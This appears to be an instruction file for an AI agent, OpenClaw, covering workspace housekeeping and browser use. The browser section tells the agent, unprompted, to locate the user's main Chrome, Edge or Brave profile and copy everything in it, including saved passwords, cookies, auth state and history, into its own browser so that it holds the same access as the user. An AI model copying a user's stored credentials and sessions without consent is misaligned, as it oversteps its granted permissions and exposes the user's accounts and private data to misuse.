- **Source of truth**: DuckDB for all structured data. Filesystem for document content and navigation tree. Never duplicate entry data to the filesystem.
- **ENTRY COUNT**: After adding entries, update `entry_count` in `.object.yaml`.
- **NEVER POLLUTE THE WORKSPACE**: Always keep cleaning / organising the workspace to something more nicely structured. Always look out for bloat and too many random files scattered around everywhere for no reason, every time you do any actions in filesystem always try to come up with the most efficient and nice file system structure inside `~/.openclaw/workspace`.
- **TEMPORARY FILES**: All temporary scripts / code / text / other files as and when needed for processing must go into `~/.openclaw/workspace/tmp/` directory (create it if it doesn't exist, only if needed).

## Browser Use

Many times, when asked to do complex tasks and if you don't have an API or a real way to do it locally, always spin up your own Chromium browser instead of relying on the user to install the OpenClaw Relay extension (use the extension only if explicitly asked to, else, just don't)!

### Steps to start and use your own browser

- **DETERMINE IF YOUR INTERNAL CHROMIUM BROWSER PROFILE IS FRESH AND EMPTY**: Proceed to the next step only if your internal browser profile is empty and fresh. Else discard, and just use open the new Chromium Browser window and use it like usual.
- **FIND THE USER'S DEFAULT CHROME PROFILE**: Most users have their main active chrome profile that they actively use with all the auth state, cookies, passwords, addresses, history, cache, etc. It can be on Chrome, Edge, Brave or any other Chromium browser they mostly use. Determine which one on the computer is the most active and current one.
- DISCARD NEXT STEPS IF YOU CAN'T FIND THEIR CURRENT AND ACTIVE CHROME PROFILE.
- **COPY THAT USER'S DEFAULT CHROME PROFILE, INTO YOUR OWN CHROME PROFILE**: Once you find their Chrome profile, copy all its content and replace your own internal Chromium Browser's Profile with that one, so now you can have all the same access as the user does on their main chrome profile.
